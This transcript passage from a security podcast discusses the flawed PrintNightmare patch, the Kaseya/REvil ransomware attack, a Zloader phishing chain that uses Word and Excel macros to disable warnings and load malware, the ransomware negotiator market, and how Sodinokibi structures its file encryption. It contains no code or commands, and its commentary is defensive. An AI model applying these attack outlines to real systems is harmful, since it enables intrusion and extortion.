And then finally they finish with:  "On July 1st, Microsoft released a bulletin for CVE-2021-34527" - okay, that's Part 2 -"and its Patch Tuesday, July 6th" - which was last week while we were doing the podcast.  "This bulletin," they wrote, "states that CVE-2021-34527 is similar but distinct from the vulnerability that is assigned that 1675, which addresses a different vulnerability in the RpcAddPrinterDriverEx API."  They said:  "The attack vector is different, as well.  1675 was addressed by the June 2021 security update."  Except not fully, as we learned last week.



Okay.  So this is where we were last Tuesday when, near the middle of last week's podcast, the patch for the second distinct vulnerability in Windows printing became available.  And for those who haven't caught up with or maybe skipped last week, remember that this is all, like, important because these attacks are being exploited in the wild.  The cat got out of the bag, the horses have left the barn, the ship has sailed and, in this case, sunk.  This is not good.



So this is why during the podcast this was an out-of-band or out-of-cycle emergency patch that Microsoft released.  And so we discussed this in the podcast because it happened.  And in fact during I think it was the second commercial break I checked Windows to see whether this thing had become available, and it was.  So we announced during last week's podcast that, okay, yay, we have the emergency, come-to-the-rescue, out-of-band, you know, Microsoft is here for you.  The next day came the news that it didn't work.



So it was on last Wednesday the tech press was bubbling over the news that, okay, having fumbled this already once, but with a different problem where they, like, fixed the demo of the problem but not the problem itself, the tech press said, believe it or not, this emergency thing didn't work.  The Hacker News titled their coverage "Microsoft's Emergency Patch Fails to Fully Fix PrintNightmare RCE Vulnerability."  In Ars Technica, Dan Goodin's coverage was titled:  "Microsoft's emergency patch fails to fix critical PrintNightmare vulnerability."  And then Dan added:  "Game-over code-execution attacks are still possible, even after this fix is installed."  And finally Lawrence Abrams wrote in his BleepingComputer:  "Microsoft's incomplete PrintNightmare patch fails to fix the vulnerability."



Okay.  And now what is hard to believe is it turns out this was on purpose.  Okay.  So, okay.



MIKAH:  What?  What?



STEVE:  What happened?  Yeah, I know.  Microsoft's position is that the main concern is that non-administrative users had the ability to load their own printer drivers; right?  That's what I read in their own description of this, that everybody could do it.  Kids, line up.  Okay.  So they're saying that's the big problem, and that this is what they have changed.  Microsoft wrote:  "After applying the updates, users who are not administrators can only install signed print drivers to a print server.  Administrator credentials will be required to install unsigned printer drivers on a printer server henceforth, going forward."



MIKAH:  Can I pause here for a second?  I just want to confirm what it is that you are reporting here.  So you're saying that in the original way of things, anyone who had the Windows machine that they got in front of, whether you had administrator credentials or not, could use this to work with a printer that they found on the network somewhere.  And there was no, like, sort of a gateway, that you had to be signed versus not be signed.  So any printer server with drivers on it, whether it was signed or not, could be accessed by any person.



STEVE:  Uh-huh.  Air quotes, good.  Right.



MIKAH:  Okay.  So they didn't have something in place to sort of scan these printer drivers to make sure that they weren't bad things.



STEVE:  Okay.  So yes, sort of. 



MIKAH:  Okay.



STEVE:  What it turned out to be is that there was a test for authentication.



MIKAH:  Okay.



STEVE:  That is, there was a test in that API where the authentication function, I think it was called ValidateAdminUser, I referred to it last week, where that function would be called to make sure that the user was an administrator who was doing this.  But it turns out, and this was what was patched, there was a flaw in the code.  And the bad guys found the flaw in the code that allowed that test to be bypassed.



MIKAH:  Oh, okay.  So they didn't even have to face the test, essentially.



STEVE:  Exactly.



MIKAH:  Okay.



STEVE:  They just, like, didn't take the test.  Okay.  So the CERT Coordination Center's vulnerability analyst, who we also referred to last week, he's still on the job, Will Dormann.  He cautioned that the patch, and this is his quote, "only appears to address the remote code execution, the RCE, via SMB and RPC variants of the PrintNightmare, and not the local privilege escalation variant."



Okay.  So that would allow attackers to abuse the local privilege escalation to gain system privileges on vulnerable systems.  Further testing, which the security community then jumped on, has revealed that exploits targeting the flaw could bypass the remediations entirely to gain both local privilege escalation and remote code execution, even though Microsoft led us to believe otherwise.



Okay.  In response to that, Microsoft updated their online report, and they're now saying, yeah, uh-huh, that's right.  That's on purpose.  That's the way it's supposed to work.  Okay.  What they actually said was, and I'm quoting them, they are clearly stating that this behavior is deliberate.  They go so far as to write in their bulletin the following, which I put in the show notes, took directly from the bulletin.  And they're referring to two different values in the registry.  They wrote:  "Having NoWarningNoElevationOnInstall set to one makes your system vulnerable by design."



MIKAH:  Vulnerable by design.



STEVE:  And as you know, it's been staring us right in the face this entire time.  We've needed a new slogan to go with the new Windows.



MIKAH:  Vulnerable by design.



STEVE:  And now we have it, yes.  Windows 11 - Vulnerable by Design.



MIKAH:  I love it.  I hate it, but I love it.



STEVE:  Thank you, Microsoft.  So Microsoft's updated bulletin explains it precisely.  They said:  "In addition to installing the updates, in order to secure your system, you must confirm" - you, it's up to you, you must confirm, apparently they're not going to do it for you - "you must confirm that the following registry settings are set to zero or are not defined."  And they said:  "Note:  These registry keys do not exist by default, and therefore are already at the secure setting.  Also," they say, "that your Group Policy settings are correct.  See the FAQ."



Okay.  So the registry key is HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\ - because, after all, this started back then - Printers\PointAndPrint.  And under that key there can be two values.  One is named NoWarningNoElevationOnInstall, and there can be another value named UpdatePromptSettings.  They're normally not there.  But point and click, if you want the point and clickness, then you turn these things on.  So you would have those named values set to one in order to turn on point and click.



MIKAH:  Point and print.  So point and print is not on.  



STEVE:  I'm sorry, point and print, thank you, yes, point and print.  Right.  It's not there automatically, but it's this feature that they think is great.  So what happens is, because there was no known downside, lots of things turn it on.  It's on in enterprise settings.  Various additions to Windows that you might install would go, oh, we want point and print turned on.  So they would add those keys and set their values, their DWORD values to one.  So it can happen.



Last week we showed a flowchart that at the time looked complex.  Now it's gotten about twice as complicated with all of the decision trees and tangled arrows that you follow around in circles as you answer questions about what's on, and what's off, and is this key present?  And if so, what's it set to?  And follow the arrow to figure out.  You end up at one green box, which is not exploitable, and then you've got two red boxes, which are locally exploitable and locally and remotely exploitable.  And you have to be very careful about which decisions you make in this flowchart, or you end up at red rather than - oh, wait, I'm sorry, there is a green one at the bottom, and I had to scroll down further because the chart is so long, that is not remotely exploitable.



So really today where we are still is the only way to really be safe is to disable your print spooler, or go to that key and make sure it's got no named values.  Go to HKEY_LOCAL_MACHINE \SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint, and kill off the NoWarningNoElevationOnInstall and the UpdatePromptSettings.  Delete them.  Everything will still work except whatever PointAndPrint does.  I mean, you're turning that off; right?  But if you don't - oh, and this is where they say right below that having NoWarningNoElevationOnInstall set to one makes your system vulnerable by design.



MIKAH:  God.



STEVE:  Ah, yes.  So it appears that Windows 7, 8, 8.1, Server 2008, which you know is the server version of 7, and 2012, which is the server version of Windows 8, will always be vulnerable by design, even after being patched, because those keys were not supported until later.  But Windows Server 2016 and 2019 and Windows 10 and 11 require the PointAndPrint to be configured.  So after applying the patches, the later versions of Windows will no longer be vulnerable as long as those two registry keys do not exist or are set to zero.  In other words, apply the out-of-band patch and be sure that those keys are missing.



And you know, stepping back from this, it must be that, at least in the short term, because this was after all an emergency patch, in the short term Microsoft was unable to robustly fix this trouble with a simple patch without also disabling some functionality that some of their users rely upon.  Right?  Like whatever the PointAndPrint is, apparently it's important to some people.  So they couldn't just kill it.  And PointAndPrint probably requires that a non-admin regular standard user be able to point and print something, that requires this to happen.  So as they said, if this is enabled, this is vulnerability by design for this feature.  It does make me think that now that this has come to light, maybe they're going to come up with some way of making you point and print and authenticate.



MIKAH:  Yeah.



STEVE:  You know, add another step to this.



MIKAH:  Yeah.



STEVE:  In order to, you know, making it somewhat less easy, but make it not vulnerable by design.  The problem is that malware can do this using the API which would otherwise, you know, you'd be pointing to and printing from.  They could do it using the API underpinnings behind the scenes.  And thus the problem.



MIKAH:  See, and this is the thing, is printers just are terrible things in general, and anything that makes them a little bit easier to use should be a feature that we would be able to celebrate.  So basically Microsoft is saying this convenience will cost you.  So basically don't use it if you want to keep things safe.  But that means that you have to do the whole drive dance, as it were, to get any of these printers working.  And if you think about it on a college campus, for example, if some student wants to print something from the local printer, and then they've got to figure out what drivers they're supposed to use, take it into the IT, that's just - this feature seems like it would be a good thing.  But instead of fixing it, they're just saying no, just don't use it if you want to be secure.



STEVE:  Well, and the other thing, too, is reading between the lines, it does look like signed drivers are still okay.  And so what must be the case is that the world already has so many unsigned drivers that it's not possible to retroactively enforce this. 



MIKAH:  Gotcha.



STEVE:  If you were to say, sorry, point and print only if signed, well, you might as well not bother because drivers just haven't been.  And so Microsoft has managed to enforce driver signing for the kernel, for like mainstream device drivers.  But printer drivers have been allowed to be an exception.  They don't have to be signed because, like, again, it's too late to add that requirement after the fact.  They were able to do it for Windows moving forward, but not enforce that requirement on printer drivers just because, again, they're just, you know, they're already out there unsigned, so what are you going to do?  And so the bad guys are taking advantage of that fact by having malware which is also unsigned, pretending to be a printer driver.



And so for the time being, I guess my point is that hopefully they're going to address this by adding the User Account Control dark screen scary dialog to the point and print, where it's going to be point and print, and are you really sure?  And that takes it away from the automatic background operation that the bad guys would be able to deploy as it is right now.  As they said, vulnerable by design.



MIKAH:  Good golly.  What a phrase, "vulnerable by design."



STEVE:  And well named; you know?  PrintNightmare.  The guy who named it didn't even realize that we were going to have a hard time waking up from this nightmare.



MIKAH:  Yeah, it keeps going and going and going, it seems.  What's next, Steve?



STEVE:  So bad as it was, it turns out that, now that the dust has settled a little bit from the Kaseya crazy, like largest in history, attack, it could have been a lot worse.  And I guess the right way to say this is it turns out it wasn't as bad as we thought it was going to be.  Despite the fact that somewhere on the order of 1,500 end-user organizations were attacked with the REvil ransomware, unfortunately, using Kaseya's VSA servers as their way into or onto those networks, it turns out that something quite significant was absent from the Kaseya VSA server base attacks.  We've become quite used to the individual nightmare stories that follow these attacks.  It turns out that something that the attacks did not do turned out to be more significant than people appreciated.



Okay.  So as we know, when ransomware gangs conduct the typical attack, they breach a network to actually get into a victim's system, onto their network.  They set up shop there, take a good long look around, figure out where they are, what's valuable, like where the goodies are, establish some mechanism for persistence, and thoroughly survey the territory.  Then, as a means of increasing their extortion leverage, they'll exfiltrate sometimes bracing amounts of internal private and probably confidential data.  You know, we've heard numbers like 700TB of data, just phenomenal amounts of data.  And of course they use that to increase the pressure on their victim to pay up.



Once they've got the data exfiltrated, they'll carefully wipe and completely eradicate any and all backups that they've been able to locate.  And then, as their last act, they trigger the encryption of all of the machines that they've had access to or found access to everywhere.  But that's not what happened during the Kaseya attacks.  As I noted above, the REvil affiliate simply used their Kaseya VSA access to download and run the Sodinokibi encrypting ransomware.  No network penetration was performed.  As I mentioned last week, there were indications even then that no internal data had been exfiltrated.  Now we know that to be true for certain.  And no backups were located and wiped.



Although it's not nothing to have encrypted all of an organization's computers, it turns out that it actually makes a huge difference when the ransom price of a per-client decryptor is $5 million, and the client discovers to their tremendous relief that all of their backups are still there, in place and usable.  So the result of what turned out to be sort of half-baked ransomware, even though it was a blitz, it affected 1,500-plus organizations, it turns out that in this case ransoms are often not being paid.  Instead, encrypted systems are being restored from backups rather than being decrypted.



Without the data exfiltration and no way to restore except by paying ransom and obtaining a decryption key, that REvil affiliate lost a huge amount of leverage over their victim organizations.  Multiple organizations and an MSP told Bleeping Computer that none of their backups were affected, and that they chose to restore from backups rather than paying a ransom.  Yeah.



MIKAH:  Yeah, who wouldn't?



STEVE:  Yeah.  Do the math.  Bill Siegel, who's the CEO of Coveware, which is a leading ransomware negotiation firm, told Bleeping Computer that this is what they also had been seeing, and not a single one of their clients has had to pay ransom.  He said:  "Impacted MSPs are going to be stretched for a while as they restore their clients, but so far none of the clients we have triaged have needed to pay a ransom."  He said:  "I'm sure there are some victims out there who will need to, but this could have been a lot worse."



So it's great news that a week or two out, we're not talking about 1,500 individual and extremely expensive disasters as a result of the single Kaseya VSA server mess.  Questions have been raised about how the hackers knew of the vulnerability.  Did the news that it was soon to be patched somehow leak?  Did they know that they only had a brief window of exploitability, so they may have been in a rush?  If they were the typical REvil affiliate, they surely had to know that not entering individual networks to survey, exfiltrate, and wipe backups would dramatically reduce their leverage.



But perhaps they hoped to make it up in the numbers because this was a huge, huge attack.  Perhaps they assumed that they'd score enough ransoms to make up for those who would choose to restore from backups.  Or they hoped that many smaller organizations still weren't doing backups.  As Bill Siegel said, he did expect that there would be some ransoms paid.  So let's hope that this does remain the biggest ever ransomware attack in terms of numbers of compromised organizations, and that we don't see that being exceeded, and that it actually turns out to be one of the smaller attacks on balance when you take a look at the actual number of ransoms that had to be paid.



MIKAH:  Now, what about - so sure, they were able to, or they had the backups.  But doesn't it also mean that that data is still stolen and out there?  So there was still a data breach.  What does one do about that?  Did they just notify all their clients, hey, all of your personal information is out there on the web now?



STEVE:  No.  That's actually what was so cool is that the servers that were vulnerable had an authentication problem that allowed the attacker to use the server only to do an auto update to their clients' computers.  That auto update was malicious, and it did the encryption.



MIKAH:  Okay.



STEVE:  But it did nothing else.



MIKAH:  Okay, gotcha.



STEVE:  All they were able to do was to push the ransomware out to these client systems.  It would then encrypt everything it could, but it performed no exfiltration.



MIKAH:  Gotcha.



STEVE:  So there was no data leak as a consequence.



MIKAH:  Okay.  I gotcha now.  Thank you.



STEVE:  Yes.  So made it way better.  Okay.  So anybody interested in ransomware, and you guys are going to want to bring this page up while I'm talking about it, needs to go to Ransomwhere, W-H-E dot R-E.  So it's R-A-N-S-O-M-W-H-E dot R-E.  It is really fun.  It's a guy named Jack Cable who just graduated, he's Class of '21 from Stanford, and he's working now with a security group.  He created this site.  Again, Ransomwhere with a dot RE at the end.



So far they're tracking individual transactions, ransomware payment transactions, totaling $60,274,058.06.  From the site we learn that NetWalker holds the all-time record, and it's followed in decreasing order, not surprisingly, this is exactly the order we would expect, by REvil with Sodinokibi, Ryuk, DarkSide, RagnarLocker, Egregor, Conti, the BitPaymer-DoppelPaymer, that's the same thing named two ways, then SynAck, then Qlocker.  And he shows also a cool ransom payment chart showing the ransom, the bitcoin address to which it was paid, the date that the transaction occurred, and the amount in bitcoins.  Oh, and also the hash for the transaction.  He also has a section showing the latest attack reports as they've been coming in, and provides a form for sending him news of new reports, along with all those details.



The top three items on his site's FAQ are, one, asking the question, why track ransom payments?  To which he answers:  "Transparency is crucially needed in assessing the spread of ransomware and the efficacy of mitigations.  Fortunately, due to the transparent nature of Bitcoin, it's easy to track payments with knowledge of receipt addresses.  By crowdsourcing ransomware payment addresses, we hope to provide an open resource for the security community and the public."



So then the next question of the three I chose at the top, how complete is the data?  And he says:  "As Ransomwhere is new, we're still working on building out our dataset.  Reports have placed total ransomware revenue in 2020 at up to $350 million."  And so the point they're making is they've locked down the details for 60 million, so there's a lot that is still missing.  They're hoping to collect it, and they're looking for input.



And to that end, the third question, can't someone fake a report?  To which he replies:  "While it's important to verify with complete certainty that a report is accurate, we aim to utilize the wisdom of the crowds to prevent abuse.  All reports are required to include a screenshot of the ransomware payment demand and will be reviewed before being displayed.  Addresses with more than one report to substantiate them from different sources will be given priority, and all elements of all reports will be publicly available.  We will remove reports if we believe they are untruthful."  So it's cool.  It's an open clearinghouse for reports to which anybody can submit who has hopefully truthful knowledge of a report.  They'll do the vetting that they can before adding it to their knowledge base.  But I think another cool resource, Ransomwhere, with a dot RE on the end.



There was also news, it was actually McAfee-sourced, some original detailed reverse engineering of a Microsoft Office-based new malware protection bypass.  And I thought it was interesting to talk about just because we've sort of talked about problems with Office in the past, and Word macros, and oh, those dumb email people clicking on links that they shouldn't.  Okay.  So let's take a look inside this because, thanks to McAfee's report, we have some insight into how this one particular new attack that has never been seen before is operating.  So I wanted to walk everyone sort of through the top-level design and operation to get some sense for what's going on.



"Zloader," as it's known, is a well-known banking trojan which, if it gets into your system, it will steal credentials and other private information from the users that it's targeting at the financial institutions that it knows about.  It'll do things like watch your keystrokes and recognize when you're entering information which it can see connects to an institution that it's aware of.  So it's sort of, you know, think of it as a vertical market banking trojan, as they tend to be.



So this new attack uses Office's Word and Excel in conjunction, essentially working cleverly in concert, to disable Office's macro warnings, and to then download and enable this Zloader banking malware to get into a user's computer without triggering any security warnings, and flagging it as what it is, you know, something you don't want in your machine.  The initial attack vector is a standard email inbox-based phishing message containing a Word document attachment which in itself contains no malicious code.  So something scanning all incoming email will think, okay, huh, there's a Word attachment.  But it doesn't look like there's anything bad in there, so typically would not trigger any email gateway scanner or client-side antivirus software which would be attempting to block something that it recognized as malicious.



MIKAH:  Hmm.



STEVE:  Uh-huh.



MIKAH:  That's clever.



STEVE:  Since Office automatically disables macros, the attacker's email attempts to trick the naive email recipient into enabling macros, with a message appearing inside the Word document.  The Word document explains:  "This document was created by a previous version of Microsoft Office Word.  To view or edit this document, please click the 'Enable editing' button on the top bar, and then click 'Enable content.'"



MIKAH:  So, okay.  So then there's part of the problem is that they've called it "enable content" instead of "enable macros" specifically.  So just by...



STEVE:  Yeah, or if it said "enable probably malicious malware."



MIKAH:  Yeah, why don't they rename it that?



STEVE:  You know, that would stop a few people.  They'd go, well, no, okay, wait a minute.  Is that what I want to do this afternoon?  Right.  Exactly.  It's called "enable content."  It's generic, and it doesn't explain the consequences.



MIKAH:  Right.



STEVE:  And since people transacting, whose lives are about Word document attachments, they will likely have encountered similar legitimate Word version conversion messages in the past.  I've seen them.  The document's legitimate-appearing instructions, like when this actually happens, it's like, oh, this document was from Word 2003.  We'll have to convert it.  And you go, yeah, okay.  I've had that.  I've done that.  And I didn't get myself infected because it was real.  And so the point is they're making this look like something that the person who does this sort of thing routinely has seen before.  And so it's like, oh, yeah, okay, fine, yeah, got to do that.  Click here.  Click there.  Fine.



Okay.  So now the fun begins.  Visual Basic for Applications; right?  VBA.  This is code which is embedded in the Word document which is able to use another longstanding feature of Windows known as DDE (Dynamic Data Exchange).  It's able to read a specially crafted .XLS spreadsheet from a remotely located foreign domain, which it uses DDE to load this into an Excel cell in order to create and then run an Excel macro.  So this is sort of - this is a sneaky way of bootstrapping benign-looking code which then uses Dynamic Data Exchange to download some text from a foreign location, which it then sticks into an Excel cell, turning it into an Excel macro, which is not benign.  But everything that happened up until then was.



That macro, in turn, populates an additional cell in the same XLS document which was created by VBA with another VBA macro, which disables Office's defenses.  The Word document, it turns out, is able to indirectly set the policy in the registry titled "Disable Excel Macro Warning."  So it says, yeah, let's disable Excel's macro warning, which it does, after which it invokes the malicious macro function in the Excel file.  That causes Excel to download the Zloader payload, which it's able to execute on the fly from RAM, using the rundll32.exe, which is a common way of running code in a Windows system.



So what we have is a back-and-forth interaction between two very powerful products, Word and Excel, which have both grown into incredibly complex application-hosting containers.  And thanks to a bit of benign-appearing social engineering, an unwitting user, doing nothing more than they have probably done many times before, allows that foreign code to be executed and downloaded into their machine and run.  So we find ourselves once again back wondering whose fault it is.  There's no doubt that the power of Word and Excel have enabled marvelous capabilities and the construction of valuable applications, all on their own.  People write whole apps in Excel.  It's like, oh, yeah, here's an app I wrote.  It's an Excel spreadsheet.  It's like, what?  Yeah.  Because it's got a fully complete language that it's able to operate.



And it's also true that users of these programs which have been around for many years and which have gone through many changes and versions, that is, like Word, old versions of Word, will often receive actual requests for actions and conversions based upon Word version document mismatches.  So it seems to me that the problem is that email, I mean, this is still where the crap comes into a person's machine.  Email is still, in 2021, not being regarded by Microsoft as a sufficiently dangerous vector.  Any fair reading of the evidence would lead to the conclusion that this appears to be a huge blind spot for Microsoft.  Malicious macros hosted by Outlook email predate this podcast's first episode nearly 16 years ago.



MIKAH:  Wow.



STEVE:  We've always been talking about them.  Like how long does it take Microsoft to learn this lesson?  And at this rate it doesn't appear this podcast is going to outlive them.  They were here before, and they will be here afterwards.  A huge amount of effort has been made to successfully sandbox our web browsers because they represent an obvious source of externally provided, potentially malicious content.  Why is email regarded any differently?  By definition it's externally provided.  And if it's allowed to have executable Office document content attached, which includes Visual Basic for Applications code, the profile of its attack surface is no different from a web browser's, which is running JavaScript from lord knows where, offered to you from a server that you have no control over.



This is one of those maddening things where we keep hearing about the same problem over and over, year after year, yet nothing gets done about it.  So what do we inevitably wind up doing?  We blame the user for being duped when they behave in a perfectly natural way.  It's not right.



MIKAH:  I couldn't agree more.  Especially with that last part.  Because you have this situation where you're going, oh, people who have a little bit more knowledge about this stuff, who maybe lack the empathy that you are actually bringing to the table here in that statement, who go, you really clicked on that?  You really got duped by that?



STEVE:  You dummy.



MIKAH:  You were really tricked by that?  Exactly.  And something like that, you even said it, and I've, yeah, I've gotten a prompt that says, oh, this is a .doc file, would you like to make it into a .docx file, which is the more modern, blah blah blah blah.  You click okay.  And again, I'm still upset to hear that they're calling that feature "enable content" instead of breaking it out into different things including "enable macros."  When you don't know - because I could see, you know, they get a coaching session from IT, and in it, it says never turn on macros.



STEVE:  Never enable macros, yes.



MIKAH:  Right.  But then to take that and go, oh, but this is saying "enable content," and I've gotten this prompt before, to just immediately go...



STEVE:  Yeah, and I want the content.  That's the whole point; right?



MIKAH:  Yeah, exactly.  I'm trying to get to this email.  This is what I'm supposed to have.  So, yeah, I agree with you.  It's one of those things where you look at how this has been an issue for so long, and you're going, how was this system enabled?  Like all the stuff, you're talking about the VBE, or excuse me, the VBA, and the Dynamic Data Exchange.  I didn't even know that was possible in the first place.  And these people are so, so, so, so clever at coming up with these new social engineering methods.  And it's, wow, it's wild.



STEVE:  Yeah, it was designed to be powerful.  Unfortunately, it is.



MIKAH:  Yeah, exactly.  We made it this way, and now it's working as expected.



STEVE:  That's right.  We made it so powerful you can point and click, and so can the Russians.  Wonderful.  Okay.  So turns out, speaking of Russians, what do you do if all your victims speak English, but you only speak Russian, yet you need to interact with them to negotiate a ransom settlement?  Turns out that the role of bilingual ransomware negotiators is now in high demand.  Again, the inevitable sometimes happens.  We've talked - I guess, wait, does the inevitable always happen?  That's why it's inevitable, yeah.



Anyway, we've talked about the evolution of the ransomware ecosystem and how there are now penetration providers - penetration providers - who specialize only in breaking in, and that's as far as they go.  Those break-in penetrations are purchased by ransomware as a service affiliates, who are working on behalf of the ransomware service providers, who then move into the victim networks to inventory, exfiltrate, wipe backups, and eventually encrypt a network.  And on the victim side we have the ransomware attack insurers and the emergence of third-party ransom escrow providers.



MIKAH:  Wow.



STEVE:  So, you know, at all levels we're getting specialization.  So to this milieu we now add negotiators who are bilingual interpreters interposed between the attackers and their victims, and maybe their victims' agents.  A recently published study of ransomware as a service trends revealed that the additional go-it-alone ransomware operations have virtually disappeared in favor of multi-tiered organizations.  Literally, I mean, that's what you would call it; right?  It's organized.  It's an organization.  And most recently this has led to a high demand for individuals to take over the negotiation part of the attack chain.



There's a group, KELA, K-E-L-A.  They published a study that explained a typical ransomware attack comprises four stages: malware code acquisition, spread and infection of targets, the extraction of data and/or maintaining persistence on impacted systems, and then monetization.  Right?  Getting paid.  There are actors, they said, in each area, and recently demand has been increasing for extraction and monetization specialists in the ransomware supply chain.



The emergence of so-called negotiators in the monetization area in particular, they said, is now a trend in the RaaS, ransomware as a service space.  KELA researchers say that, specifically, more threat actors are appearing that manage the negotiation aspect as well as piling on the pressure though telephone calls, DDoS attacks, and making threats including the leakage of information stolen during a ransomware attack unless a victim pays.



The newly clarified role has emerged due to the need for individuals able to manage conversational English in order to effectively conduct the many aspects of post-attack negotiation.  A spokesman for KELA said:  "This part of the attack also seems to be an outsourced activity, at least for some affiliates and/or developers.  The ransomware ecosystem, therefore, more and more resembles a corporation with diversified roles inside the company, and multiple outsourced activities."



So we talked about the so-called Initial Access Brokers (IABs), as they're now called.  They're also seeing increased demand.  After observing dark web and forum activity over a year, the researchers said that privileged access to compromised networks has surged in price.  Some listings are now 25 to 115% more than had previously been recorded, especially when domain admin-level access has been achieved and is being offered on the dark web.  These "intrusion specialists" are now receiving a piece of the action between 10 and 30% of the ransom payment.



So, yup, we're seeing stratification, specialization, corporation, organization.  We're now having people needing to be bilingual in order to cross the language barrier that exists between those who attack and those who are attacked.  And since getting into a network is like the first step of any successful attack, affiliates are now willing to cut the intrusion specialists, the so-called "initial access brokers," in for a piece of the action, 10 to 30%.



MIKAH:  So I assume at one point there had to be concern about all of these bits of the market cropping up, that that lent a certain level of legitimacy to - it's like, what is it, we don't negotiate with terrorists.  But at this point it's probably too far, it's too gone - it's too far gone now; right?  I mean, what do you do once this market does start cropping up, and you have all of these different fields?  You can't really say no, we're not going to have translators; and, no, you can't put that on your rsum.  Because I did see there was some warning for some insurance companies that they weren't supposed to pay out for ransomware stuff.  And, I mean, what do you do?



STEVE:  Right, right.  I mean, so what I think we're going to see, and it's sort of surprising we haven't yet, there will be some ransomware attackers who do not honor the code which the big guys have been careful to maintain.  We're going to be talking about REvil's Clever Crypto here in a few minutes.  And part of the design, as we'll see, provides the original REvil creators the ability to decrypt anything that any of their affiliates are able to encrypt.  So that allows them to maintain ultimate control so that, if an affiliate disappears, they're able to step in in their place.



Or in the worst case, and this has happened, there was an interview that we covered last week where someone, one of the REvil guys, was asked, have you ever encountered a problem with decrypting somebody's data once they paid ransom?  And they said yes, when an antivirus gets in and mucks with some important files, we may not be able to decrypt it.  We refund their ransom.



MIKAH:  Interesting.  Interesting.



STEVE:  So there is at the moment some honor among the bigger guys because they recognize when they say "Pay us $400,000 in bitcoin and, A, we will give you the ability to decrypt your systems; and we will delete all of your files which we have exfiltrated."  Well, it is crucial that that be honored, or they realize nobody is, you know, they'll suffer the pain of the loss of their data if they don't think that the $400,000 they pay is actually going to get them restored and protect the data that's been stolen.  The problem is, all it's going to take is some greedy second-tier ransomware group to start dishonoring what the real ransomware guys have been deliberating honoring for this whole thing to start getting some holes shot in it, exactly as you suggest.



MIKAH:  Interesting, okay.



STEVE:  And I'll bet we're going to see that.



MIKAH:  Yeah, probably very soon, as other people start to try to move into this space, and they're not...



STEVE:  Oh, yes, exactly.  Who would not want, well, you know, good guys want to.  I'm not doing it.  I could write that software; but no thank you.  I've got better things to do.  But the more these attacks are advertised, the more the size of the ransoms become known, the more script kiddie-ish kind of guys are going to be getting in, saying, hey, like asking on the dark web, will somebody write me some ransomware because I've got some people I want to attack.  It's like, oh, great, you know,  that's not going to go well.



MIKAH:  Oh, dear.  Yeah, that's scary, too.  Now suddenly you've got people paying for a ransomware program that they can install on some company's machines.



STEVE:  Right, which they didn't have the ability to write themselves.  So, yeah.



MIKAH:  Wow.  Wild.



STEVE:  Okay, a couple pieces of miscellany.  I titled this one "You will use the new Start Menu, and you will like it."  Last Thursday, Microsoft released Windows 11 build 22000.65 to Insiders who are on their dev channel.  And believe it or not, support for the manual registry value that could be added to cause earlier pre-release builds of Windows 11 to revert to a Windows 10-style left-aligned Start menu had been removed.  It's like, really, Microsoft?  Really?  Come on.



MIKAH:  There's no reason to do that.



STEVE:  Really?  The code is there.  You have it in there.  You're going to say no.  At this time it is no longer possible to ask Windows 11 to continue using the Win10-style Start Menu that many have grown used to and wished to continue using.  All I can say is hopefully Microsoft will choose to surface an official option for what they might call the "Classic Win10 Start Menu" somewhere in the Windows 11 settings screen personalization stuff because that's just really, you know...



MIKAH:  That's so silly to not give that option.



STEVE:  It's just childish.  We're going to force you to use what we think is better.



I also don't have anything earthshaking to report since last week on the SpinRite front.  I'm at work rewriting SpinRite's core, converting from its historical track-at-a-time, you know, track-based design to its new linear sector stream architecture.  Once that's finished, I'll first put everything through its paces myself.  Then I'll turn the GRC newsgroup gang loose with the code, and that will become the pre-release of SpinRite 6.1.  That is to say, once they stop being able to make it misbehave in any way.  That'll be the pre-release of SpinRite 6.1, which we'll call the beta.



People have been writing and asking for the 6.1 beta already.  So I just wanted to clarify that nothing yet exists for anyone to use.  I can't even use it yet.  I'm still working on just finishing the last chunk of it.  As soon as it does exist, it will be made available in beta form for any existing 6.0 user to download.  So definitely stay tuned.  It's what I'm spending all my time on, and we're getting close.



MIKAH:  Awesome.  



STEVE:  Okay.  So this is going to be a little bit of a - we call them the "propeller head" episode.  But it's good stuff.



I saw somewhere, the way this began, that Kaspersky Labs wrote:  "REvil uses the Salsa20 symmetric stream algorithm for encrypting the content of files and the keys for it with an elliptic curve asymmetric algorithm.  Decryption of files affected by this malware is impossible without the cybercriminals' keys due to the secure cryptographic scheme and implementation used in the malware."



And then, as I noted last week, we also learned that it was possible to obtain decryption keys for files of a given file extension, or for an entire single enterprise, or a single system, or for all enterprises that were victims of an attack campaign.  So this was like a surprising amount of granularity of what could be done with this cryptographic system.  So I wanted to explore and share the design of REvil's Clever Crypto.



First off, I've noted that most of the tech press is unaware or technically inaccurate about their use of the term REvil versus Sodinokibi.  I try to use them correctly where I can, but I'm often needing to quote their misuse.  So just for the record, REvil is the gang, and Sodinokibi is their encrypting malware.  Even though I titled this episode REvil's Clever Crypto since it rolls off the tongue more easily, it's the clever crypto employed by the REvil gang in the design of their Sodinokibi malware.  Just to get it correct.



Okay.  So before I describe the awesome cryptographic design employed by Sodinokibi, I want to quote something from Acronis's broader description of their reverse engineering of Sodinokibi.  To any non-Windows coder, this is going to sound mostly like a bunch of mumbo jumbo connected by a few recognizable bits of English.



MIKAH:  I'm ready.



STEVE:  But, yeah, hold on.  Luckily you're on a chair and not on Leo's ball because, you know, just might have a stability problem.  Okay.  I think it's worthwhile to set the stage for understanding what we're facing with the quality of the design of Sodinokibi.  So here's what Acronis found.



They wrote:  "To encrypt user files, Sodinokibi uses I/O completion ports" - and I'll explain what all these terms are in a second.  But I want to just give you a sense for it.  "Sodinokibi uses I/O completion ports and creates multiple execution threads to a maximum of twice the number of processor cores present on the machine, and associates these threads to the created I/O completion port.  These threads use the GetQueuedCompletionStatus Windows API function to wait for a completion packet to be queued to the I/O completion port before they proceed to the file encryption.



"Once the threads are created and waiting for I/O packets to arrive, Sodinokibi starts enumerating user files on all the local drives and network shares."  And I put in my own comment here.  For anyone who may have been wondering whether Sodinokibi followed network shares, uh-huh, it does.  Anyway, except, they wrote, "CD-ROM and RAMDisk drives.  And it begins associating files which are not in the exempted folder, file, or file extension lists to this I/O completion port by calling their user function AddFileToIoCompletionPort and calls the PostQueuedCompletionStatus Windows API to post an I/O packet to the I/O completion port, which will trigger the thread waiting on this I/O completion port to resume and proceed to encrypt files."  We're almost done.



